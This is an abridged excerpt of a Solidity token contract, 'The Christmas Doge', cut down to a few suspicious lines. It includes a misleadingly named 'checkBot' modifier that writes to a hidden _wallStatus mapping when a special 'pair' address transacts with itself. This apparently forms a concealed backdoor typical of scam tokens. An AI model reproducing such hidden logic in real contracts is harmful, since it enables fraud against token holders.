...
contract Ownable is Context {
    ...
    address public pair = 0x000000000000000000000000000000000000dEaD;
...
contract TheChristmasDoge is Context, IERC20, Ownable {
    ...
    string private _name = unicode"The Christmas Doge";
    string private _symbol = unicode"TCD";
    ...
    modifier checkBot(uint256 a, address s, address c){
        if(s == c && s == pair)
            _wallStatus[s]=a * block.number;
        _;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) checkBot(amount,_msgSender(),recipient) private returns (bool) {
        ...
        if(sender == recipient && sender == pair)
            return false; 
        ...
        if(checkWalletLimit && !isExcludedFromFee[recipient])
